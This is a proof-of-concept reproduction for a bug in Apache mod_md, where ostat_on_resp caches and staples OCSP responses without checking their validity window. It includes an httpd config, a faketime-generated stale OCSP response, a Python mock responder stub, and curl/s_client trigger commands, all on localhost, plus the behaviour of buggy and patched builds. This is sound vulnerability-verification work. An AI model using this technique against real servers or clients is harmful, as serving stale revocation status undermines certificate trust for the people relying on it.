# PoC 120 — OCSP Response Times Accepted Without Validity Check

`ostat_on_resp` parses `thisUpdate`/`nextUpdate` and stores the response
without confirming that *now* falls inside `[thisUpdate, nextUpdate]`, so
expired or not-yet-valid OCSP responses are cached and later stapled.

## Setup

`mod_md` configured to maintain a managed certificate, plus a mock OCSP
responder we control. The responder returns a structurally valid GOOD
status but with a `nextUpdate` already in the past. Run httpd as the
unprivileged user with `system clock` correct so the staleness is real.

`httpd.conf`:

```apache
ServerName 127.0.0.1
Listen 4443
LoadModule ssl_module            modules/mod_ssl.so
LoadModule md_module             modules/mod_md.so
LoadModule socache_shmcb_module  modules/mod_socache_shmcb.so

MDStapling on
MDStaplingRenewWindow 1d
MDStoreDir /tmp/md-store

<VirtualHost *:4443>
    ServerName cert.local
    SSLEngine on
    SSLCertificateFile  /tmp/srv.crt
    SSLCertificateKeyFile /tmp/srv.key
</VirtualHost>
```

Cert with AIA pointing at the mock responder:

```bash
openssl req -x509 -newkey rsa:2048 -nodes -days 30 \
  -keyout /tmp/srv.key -out /tmp/srv.crt \
  -subj '/CN=cert.local' \
  -addext 'authorityInfoAccess=OCSP;URI:http://127.0.0.1:8888/'
```

## Mock stale OCSP responder

We pre-bake a stale signed OCSP response and serve it verbatim:

```bash
# CA == self-signed cert above, for simplicity.
faketime '2024-01-01 12:00:00' \
  openssl ocsp -index /tmp/index.txt \
               -CA /tmp/srv.crt -rkey /tmp/srv.key -rsigner /tmp/srv.crt \
               -ndays 1 \
               -reqin /tmp/req.der \
               -respout /tmp/stale_resp.der
```

Listener stub:

```python
# /tmp/ocsp_stale.py
import socket, sys
resp = open("/tmp/stale_resp.der", "rb").read()
srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("127.0.0.1", 8888)); srv.listen(2)
while True:
    c, _ = srv.accept()
    buf = b""
    while b"\r\n\r\n" not in buf:
        buf += c.recv(4096)
    body_len = 0
    for line in buf.split(b"\r\n"):
        if line.lower().startswith(b"content-length:"):
            body_len = int(line.split(b":")[1].strip())
    while len(buf) - buf.index(b"\r\n\r\n") - 4 < body_len:
        buf += c.recv(4096)
    c.send(b"HTTP/1.0 200 OK\r\n"
           b"Content-Type: application/ocsp-response\r\n"
           b"Content-Length: %d\r\n\r\n" % len(resp) + resp)
    c.close()
```

## Trigger

```bash
python3 /tmp/ocsp_stale.py &
httpd -X -f /tmp/httpd.conf &
sleep 2

# Force mod_md to fetch and cache the OCSP response.
curl -sv --resolve cert.local:4443:127.0.0.1 \
     --cacert /tmp/srv.crt \
     -H 'Status-Request: 1' \
     https://cert.local:4443/.well-known/ocsp 2>/dev/null

# Inspect the stapled response shown to a fresh client.
echo | openssl s_client -connect 127.0.0.1:4443 \
        -servername cert.local -status -CAfile /tmp/srv.crt 2>&1 \
        | sed -n '/OCSP response:/,/^---$/p'
```

## Observed effect

Buggy build: the stapled OCSP response carries `Next Update:
2024-01-02 12:00:00 GMT` (long past the 2026 wall clock). The status is
shown as `good`, and `/tmp/md-store/ocsp/` contains the stored stale
response.

Patched build: `ostat_on_resp` rejects the response with
`md_result_printf(... "OCSP response outside validity period ...")` in
`error_log`, the cache stays empty, and `s_client -status` reports
`OCSP response: no response sent`.

## Marker

`Next Update` timestamp on the stapled response strictly less than current
time, plus a corresponding `mod_md` debug line on the patched build that
does *not* appear on the buggy build.
